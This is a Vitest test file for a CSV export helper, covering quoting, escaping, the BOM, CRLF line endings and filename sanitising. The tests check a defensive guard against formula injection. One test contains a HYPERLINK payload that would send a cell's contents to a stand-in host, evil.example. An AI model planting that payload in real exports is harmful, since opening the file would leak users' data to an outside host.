import { describe, expect, it } from "vitest";
import {
  CSV_BOM,
  CSV_EOL,
  csvDocument,
  csvField,
  csvFilename,
  csvRow,
} from "@/lib/csv";

describe("csvField", () => {
  it("quotes every field, including a plain one", () => {
    expect(csvField("media.view")).toBe('"media.view"');
  });

  it("renders null and undefined as an empty field, not as the word", () => {
    expect(csvField(null)).toBe('""');
    expect(csvField(undefined)).toBe('""');
  });

  it("keeps a separator inside one field", () => {
    expect(csvField("Demir, Ayşe")).toBe('"Demir, Ayşe"');
  });

  it("doubles an embedded quote", () => {
    expect(csvField('say "no"')).toBe('"say ""no"""');
  });

  it("keeps a newline inside one field instead of ending the row", () => {
    expect(csvField("line one\r\nline two")).toBe('"line one\r\nline two"');
  });

  it("does not evaluate a leading equals sign as a formula", () => {
    expect(csvField("=1+1")).toBe(`"'=1+1"`);
  });

  it("guards the other three formula leads a spreadsheet accepts", () => {
    expect(csvField("+41 555")).toBe(`"'+41 555"`);
    expect(csvField("-2")).toBe(`"'-2"`);
    expect(csvField("@SUM(A1)")).toBe(`"'@SUM(A1)"`);
  });

  it("guards the attack that reads a cell out to a remote host", () => {
    // The canonical CSV injection payload. Without the guard, opening the file
    // is enough to run it.
    expect(csvField('=HYPERLINK("http://evil.example/?"&A1,"click")')).toBe(
      `"'=HYPERLINK(""http://evil.example/?""&A1,""click"")"`,
    );
  });

  it("guards a formula that also carries quotes, in that order", () => {
    // The apostrophe goes on before the quote doubling, so it stays outside the
    // escaped text rather than becoming part of it.
    expect(csvField('="a"')).toBe(`"'=""a"""`);
  });

  it("leaves a formula lead alone when it is not the first character", () => {
    expect(csvField("a=1")).toBe('"a=1"');
  });

  it("does not treat an empty string as a formula", () => {
    expect(csvField("")).toBe('""');
  });
});

describe("csvRow", () => {
  it("joins fields with a comma and adds no line ending", () => {
    expect(csvRow(["a", 2, null])).toBe('"a","2",""');
  });
});

describe("csvDocument", () => {
  it("starts with the byte order mark so Excel reads UTF-8", () => {
    expect(csvDocument([["Aşama"]]).startsWith(CSV_BOM)).toBe(true);
  });

  it("ends every row with CRLF, the last one included", () => {
    expect(csvDocument([["a"], ["b"]])).toBe(
      `${CSV_BOM}"a"${CSV_EOL}"b"${CSV_EOL}`,
    );
  });

  it("keeps the column count when a value contains the separator", () => {
    const text = csvDocument([
      ["time", "detail"],
      ["2026-09-09T10:00:00.000Z", 'a, b, "c"'],
    ]);
    // Two rows, and the second still has exactly one comma outside quotes.
    expect(text.split(CSV_EOL).filter(Boolean)).toHaveLength(2);
    expect(text).toContain('"2026-09-09T10:00:00.000Z","a, b, ""c"""');
  });
});

describe("csvFilename", () => {
  it("carries the date and stays ASCII", () => {
    expect(csvFilename("kademe-audit", new Date(2026, 8, 9))).toBe(
      "kademe-audit-2026-09-09.csv",
    );
  });

  it("drops anything a header value cannot carry", () => {
    expect(csvFilename('denetim "kaydı"', new Date(2026, 0, 2))).toBe(
      "denetim-kayd-2026-01-02.csv",
    );
  });
});
